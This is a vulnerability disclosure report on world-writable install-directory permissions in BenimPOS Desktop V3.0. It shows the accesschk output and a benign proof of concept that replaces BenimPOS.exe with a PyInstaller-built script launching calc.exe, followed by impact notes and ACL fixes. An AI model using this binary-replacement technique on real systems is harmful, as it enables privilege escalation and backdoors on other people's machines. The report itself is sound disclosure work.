🔒 Security Vulnerability Report
Product: BenimPOS Desktop V3.0
Vulnerability Type: Insecure File Permissions
Affected Components: BenimPOS.exe, unins000.exe, System.Data.SQLite.dll
Vulnerability Class: CWE-276: Incorrect Default Permissions
Proof of Concept by: Fatih Bülbül
Test Environment: Windows 11 x64 – Local Admin + Standard User


🛠️ 1. Vulnerability Detection
First, I checked the permissions of the directory where the BenimPOS application is installed using the AccessChk.exe tool developed by Sysinternals:
Command Used:
accesschk.exe -dqvw "C:\Program Files (x86)\BenimPOS"

Obtained Result:
RW Everyone
  FILE_ALL_ACCESS
RW BUILTIN\Users
  FILE_ALL_ACCESS


📌 FILE_ALL_ACCESS permissions have been granted to the "Everyone" and "BUILTIN\Users" groups. This means that any standard user can modify the application's .exe or .dll files.
📸 A screenshot of this output is provided below:

<img width="945" height="437" alt="image" src="https://github.com/user-attachments/assets/91dbc4e4-1f96-4652-a7ea-dff804744fa2" />

<img width="945" height="536" alt="image" src="https://github.com/user-attachments/assets/17494949-0b24-44a5-95ab-0d258b6706e6" />


2. Exploitation of the Vulnerability
With these permissions, I replaced the BenimPOS.exe file in the application directory with a custom harmless .exe file I created.
📦 Malicious EXE Example (launches calc.exe):
import subprocess
import sys
import traceback

try:
    subprocess.Popen(r"C:\\Windows\\System32\\calc.exe")
except Exception as e:
    with open("error_log.txt", "w") as f:
        f.write(traceback.format_exc())
    sys.exit(1) 


•	I converted this script into an .exe file (e.g., using PyInstaller).
•	Then, I replaced the original BenimPOS.exe file with this new executable.
🔁 Program Launch:
•	Instead of opening BenimPOS, the calculator (calc.exe) was executed.
📸 Screenshot (calc.exe launched):

<img width="945" height="711" alt="image" src="https://github.com/user-attachments/assets/f3cd6808-79f7-47b7-ae2f-78c2a82d3bea" />

<img width="945" height="748" alt="image" src="https://github.com/user-attachments/assets/bacfc701-27a4-4812-ae87-881c0987c1b1" />

<img width="945" height="660" alt="image" src="https://github.com/user-attachments/assets/b749dd1f-0f6d-4e4d-a2f7-d2cb5e151aae" />


🧨 3. Impact and Risk
The impact of this vulnerability is critical:
Category	Description
Privilege Escalation	A standard user can impersonate processes with administrative privileges.
Malicious Code Injection	An EXE or DLL file can be modified to insert a backdoor.
Application Manipulation	The POS application can be altered with malicious functionalities to deceive users.
________________________________________
🩹 4. Recommended Solution
1.	Standard users should not have write permissions in the application installation directory.
2.	Only the following groups should have write access to the C:\Program Files (x86)\BenimPOS directory:
o	Administrators
o	SYSTEM
3.	Access Control Lists (ACLs) should be properly configured during installation.
